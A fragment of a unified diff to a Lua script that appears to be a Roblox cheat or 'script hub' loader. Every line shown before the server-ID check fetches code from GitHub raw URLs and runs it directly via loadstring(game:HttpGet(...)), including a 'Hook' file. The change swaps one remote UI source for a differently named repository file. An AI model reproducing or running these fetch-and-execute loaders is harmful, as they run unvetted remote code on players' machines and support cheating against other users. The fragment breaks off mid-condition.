@@ -1,6 +1,6 @@
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SaltyHB/Poggers/main/Public"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/ahmadsgamer2/main/Hook"))()
-    local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/HouseOfBalance/ZueszUI/main/UI"))()
+    local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/bot21333/C-/main/GetGenv(function().lua"))()
     local b = game.JobId
     local c = game.PlaceId
     if _G.ZueszYTBHubX_Join == {c, b} then
